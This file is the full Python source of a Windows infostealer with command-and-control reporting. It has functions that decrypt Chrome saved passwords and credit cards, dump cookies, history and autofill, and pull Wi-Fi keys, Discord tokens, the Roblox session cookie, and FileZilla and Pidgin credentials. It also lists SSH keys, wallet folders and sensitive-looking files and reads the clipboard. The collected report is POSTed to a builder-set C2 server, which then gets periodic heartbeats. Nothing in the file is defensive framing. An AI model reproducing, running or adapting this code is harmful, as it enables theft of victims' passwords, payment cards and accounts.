# ==================================================================================================
# --- IMPORTS ---
# ==================================================================================================
import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
import uuid
import time
import requests
import threading
from datetime import datetime, timedelta
import xml.etree.ElementTree as ET

# Try to import optional modules required for advanced harvesting
try:
    import win32crypt
    from Crypto.Cipher import AES
    import pyperclip
    import browser_cookie3
except ImportError:
    pass # If these fail, the functions that need them will be disabled.

# ==================================================================================================
# --- CONFIGURATION ---
# ==================================================================================================
# THIS URL IS REPLACED BY THE BUILDER
C2_URL = "http://127.0.0.1:5002" 
HEARTBEAT_INTERVAL = 30 # Seconds

# ==================================================================================================
# --- HELPER FUNCTIONS ---
# ==================================================================================================
def run_command(command):
    """Executes a shell command and returns its output, hiding the console window."""
    try:
        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception: return "Command failed to execute."

def get_public_ip():
    """Fetches the public IP address from an external service."""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except Exception: return "N/A"

def get_encryption_key():
    """Retrieves the AES encryption key for Chrome/Edge browsers from the 'Local State' file."""
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except Exception: return None

def decrypt_data(data, key):
    """Decrypts data that was encrypted with AES-256-GCM (used by Chrome/Edge)."""
    try:
        iv = data[3:15]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(data[15:])[:-16].decode()
    except Exception: return ""

# ==================================================================================================
# --- GRANULAR DATA HARVESTING FUNCTIONS ---
# ==================================================================================================

# --- POINT 1-2, 7, 9 ---
def harvest_os_host_info():
    uname = platform.uname()
    uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    return (f"OS Version: {uname.system} {uname.release}\n"
            f"Build Number: {platform.win32_ver()[1]}\n"
            f"System Architecture: {platform.machine()}\n"
            f"Hostname: {socket.gethostname()}\n"
            f"Live System Uptime: {uptime}")

# --- POINT 3-6 ---
def harvest_hardware_info():
    info = f"CPU Model: {platform.processor()}\n"
    info += f"GPU Model(s):\n{run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'caption'])}\n"
    info += f"Installed RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB\n\n"
    info += "Disk Drives and Sizes:\n"
    for p in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(p.mountpoint)
            info += f"  - {p.device} ({p.fstype}): {usage.total / (1024**3):.2f} GB\n"
        except Exception: continue
    return info

# --- POINT 8 ---
def harvest_user_accounts():
    return run_command(['net', 'user'])

# --- POINT 10 ---
def harvest_running_processes():
    return run_command(['tasklist'])

# --- POINT 11 ---
def harvest_installed_applications():
    return run_command(['wmic', 'product', 'get', 'name,version'])

# --- POINT 12 ---
def harvest_security_products():
    av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'])
    fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName'])
    return f"Antivirus:\n{av if 'DisplayName' in av else 'Not Found'}\n\nFirewall:\n{fw if 'DisplayName' in fw else 'Not Found'}"

# --- POINT 14-16 ---
def harvest_ip_mac_addresses():
    return (f"Private IP Address: {socket.gethostbyname(socket.gethostname())}\n"
            f"Public IP Address: {get_public_ip()}\n"
            f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}")

# --- POINT 17 ---
def harvest_wifi_profiles():
    info = ""
    profiles = run_command(['netsh', 'wlan', 'show', 'profiles'])
    profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles)
    if not profile_names: return "No WiFi profiles found."
    for name in profile_names:
        name = name.strip()
        profile_info = run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'])
        password = re.search(r"Key Content\s*:\s(.*)", profile_info)
        info += f"Profile: {name}\nPassword: {password.group(1).strip() if password else 'N/A'}\n\n"
    return info

# --- POINT 18-19 ---
def harvest_active_connections():
    return (f"Active Network Connections (netstat):\n{'-'*35}\n{run_command(['netstat', '-an'])}\n\n"
            f"ARP Table (Local Network Devices):\n{'-'*35}\n{run_command(['arp', '-a'])}")

# --- POINT 20 ---
def harvest_dns_cache():
    return run_command(['ipconfig', '/displaydns'])

# --- POINT 21 ---
def harvest_browser_passwords():
    key = get_encryption_key()
    if not key: return "Could not get browser encryption key."
    output = ""
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if os.path.exists(db_path):
        temp_db = shutil.copy2(db_path, "login_temp.db")
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if (password := decrypt_data(row[2], key)):
                output += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\n\n"
        conn.close(); os.remove(temp_db)
    return output if output else "No passwords found."

# --- POINT 29 ---
def harvest_browser_credit_cards():
    key = get_encryption_key()
    if not key: return "Could not get browser encryption key."
    output = ""
    db_path_cc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
    if os.path.exists(db_path_cc):
        temp_db_cc = shutil.copy2(db_path_cc, "web_temp.db")
        conn = sqlite3.connect(temp_db_cc)
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for row in cursor.fetchall():
            if (cc_number := decrypt_data(row[3], key)):
                output += f"Name: {row[0]}\nExpires: {row[1]}/{row[2]}\nNumber: {cc_number}\n\n"
        conn.close(); os.remove(temp_db_cc)
    return output if output else "No credit cards found."

# --- POINT 22 ---
def harvest_all_cookies():
    try:
        output = ""
        cookies = browser_cookie3.load()
        count = 0
        for c in cookies:
            output += f"Domain: {c.domain}, Name: {c.name}, Value: {c.value[:50]}...\n"
            count += 1
            if count > 250:
                output += "\n... and many more."
                break
        return output if output else "No cookies found."
    except Exception as e: return f"Error harvesting cookies: {e}"
    
# --- POINT 23 ---
def harvest_roblox_cookie():
    try:
        cookies = browser_cookie3.load()
        for c in cookies:
            if c.name == '.ROBLOSECURITY':
                return f"Domain: {c.domain}\nValue: {c.value}\n"
        return "Not found."
    except Exception: return "Failed to load cookies."

# --- POINT 32 ---
def harvest_browser_history():
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        if not os.path.exists(db_path): return "History database not found."
        temp_db = shutil.copy2(db_path, "history_temp.db")
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 150")
        output = "\n".join([f"URL: {row[0]}\nTitle: {row[1]}\n" for row in cursor.fetchall()])
        conn.close(); os.remove(temp_db)
        return output if output else "No history found."
    except Exception as e: return f"Error harvesting history: {e}"

# --- POINT 33 ---
def harvest_browser_autofill():
    try:
        db_path_af = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
        if not os.path.exists(db_path_af): return "Autofill database not found."
        temp_db_af = shutil.copy2(db_path_af, "autofill_temp.db")
        conn = sqlite3.connect(temp_db_af)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        output = "\n".join([f"{row[0]}: {row[1]}" for row in cursor.fetchall()])
        conn.close(); os.remove(temp_db_af)
        return output if output else "No autofill data found."
    except Exception as e: return f"Error harvesting autofill: {e}"
    
# --- POINT 24 ---
def harvest_discord_tokens():
    output = ""
    token_paths = {
        'Discord': os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb"),
    }
    for name, path in token_paths.items():
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                with open(os.path.join(path, file), errors='ignore') as f:
                    for line in f.readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}", line.strip()):
                            output += f"Found in {name}: {token}\n"
    return output if output else "No Discord tokens found."

# --- POINT 25 ---
def harvest_telegram_session():
    telegram_path = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
    return "Found and can be exfiltrated." if os.path.exists(telegram_path) else "Not found."

# --- POINT 26 ---
def harvest_filezilla_credentials():
    try:
        filezilla_path = os.path.join(os.environ["APPDATA"], "FileZilla", "recentservers.xml")
        if not os.path.exists(filezilla_path): return "Not found."
        output = ""
        tree = ET.parse(filezilla_path)
        for server in tree.findall('.//Server'):
            host, port, user = server.find('Host').text, server.find('Port').text, server.find('User').text
            password = base64.b64decode(server.find('Pass').text).decode()
            output += f"Host: {host}:{port}\nUser: {user}\nPass: {password}\n\n"
        return output
    except Exception: return "Failed to parse credentials."

# --- POINT 27 ---
def harvest_pidgin_credentials():
    try:
        pidgin_path = os.path.join(os.environ["APPDATA"], ".purple", "accounts.xml")
        if not os.path.exists(pidgin_path): return "Not found."
        output = ""
        tree = ET.parse(pidgin_path)
        for account in tree.findall('.//account'):
            protocol, name, password = account.find('protocol').text, account.find('name').text, account.find('password').text
            output += f"Protocol: {protocol}\nUser: {name}\nPass: {password}\n\n"
        return output
    except Exception: return "Failed to parse credentials."

# --- POINT 28 ---
def harvest_ssh_keys():
    ssh_path = os.path.join(os.environ["USERPROFILE"], ".ssh")
    if not os.path.exists(ssh_path): return "No .ssh directory found."
    return "\n".join(os.listdir(ssh_path))

# --- POINT 30 ---
def harvest_crypto_wallets():
    output = ""
    wallet_paths = {"Exodus": os.path.join(os.environ["APPDATA"], "Exodus")}
    for name, path in wallet_paths.items():
        if os.path.exists(path):
            output += f"{name}: Found at {path}\n"
    return output if output else "No known wallet folders found."

# --- POINT 31 ---
def harvest_sensitive_documents():
    output = ""
    search_dirs = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Downloads"]]
    keywords = ['password', 'seed', 'tax', 'privatekey', 'wallet']
    found_files = []
    for s_dir in search_dirs:
        if os.path.exists(s_dir):
            for root, _, files in os.walk(s_dir):
                if len(found_files) > 50: break
                for file in files:
                    if any(keyword in file.lower() for keyword in keywords):
                        found_files.append(os.path.join(root, file))
    return "\n".join(found_files) if found_files else "No files with sensitive keywords found in user directories."

# --- POINT 34 ---
def harvest_clipboard_contents():
    try:
        return pyperclip.paste()
    except Exception: return "Could not get clipboard data."

# --- POINT 13 ---
def harvest_environment_variables():
    return json.dumps(dict(os.environ), indent=2)

# ==================================================================================================
# --- MAIN PAYLOAD LOGIC ---
# ==================================================================================================
def harvest_all_data():
    """This is the main orchestrator function. The keys in this dictionary become the TABS in the GUI."""
    data_sections = {
        # System
        "OS & Host Info": harvest_os_host_info,
        "Hardware Info": harvest_hardware_info,
        "User Accounts": harvest_user_accounts,
        "Running Processes": harvest_running_processes,
        "Installed Apps": harvest_installed_applications,
        "Security Products": harvest_security_products,
        # Network
        "IP & MAC Addresses": harvest_ip_mac_addresses,
        "Active Connections": harvest_active_connections,
        "Wi-Fi Profiles": harvest_wifi_profiles,
        "DNS Cache": harvest_dns_cache,
        # Browser
        "Browser Passwords": harvest_browser_passwords,
        "Browser Credit Cards": harvest_browser_credit_cards,
        "Browser Cookies": harvest_all_cookies,
        "Roblox Cookie": harvest_roblox_cookie,
        "Browser History": harvest_browser_history,
        "Browser Autofill": harvest_browser_autofill,
        # Applications & Credentials
        "Discord Tokens": harvest_discord_tokens,
        "Telegram Session": harvest_telegram_session,
        "FileZilla Credentials": harvest_filezilla_credentials,
        "Pidgin Credentials": harvest_pidgin_credentials,
        "SSH Keys": harvest_ssh_keys,
        "Crypto Wallets": harvest_crypto_wallets,
        # Miscellaneous
        "Sensitive Documents": harvest_sensitive_documents,
        "Clipboard Contents": harvest_clipboard_contents,
        "Environment Variables": harvest_environment_variables,
    }
    
    final_report = ""
    # Wrap each function call in a try-except block to prevent one failure from stopping the whole script
    for title, func in data_sections.items():
        try:
            final_report += f"--- {title} ---\n\n{func()}\n\n"
        except Exception as e:
            final_report += f"--- {title} ---\n\nAn error occurred during harvesting: {e}\n\n"
            
    return final_report.strip()

def send_to_c2(endpoint, data):
    """Sends data to the specified C2 endpoint."""
    try:
        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=20)
        return True
    except requests.RequestException: return False

def maintain_presence(session_id):
    """Continuously sends heartbeats to the C2 server in a background thread."""
    while True:
        send_to_c2("/api/heartbeat", {"session_id": session_id})
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    
    # Run all harvesting functions on initial execution
    harvested_data = harvest_all_data()
    
    # Prepare and send the initial registration package
    registration_data = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
    if send_to_c2("/api/register", registration_data):
        # If registration is successful, start the heartbeat loop
        threading.Thread(target=maintain_presence, args=(session_id,), daemon=True).start()
        # Keep the main thread alive indefinitely
        while True: time.sleep(60)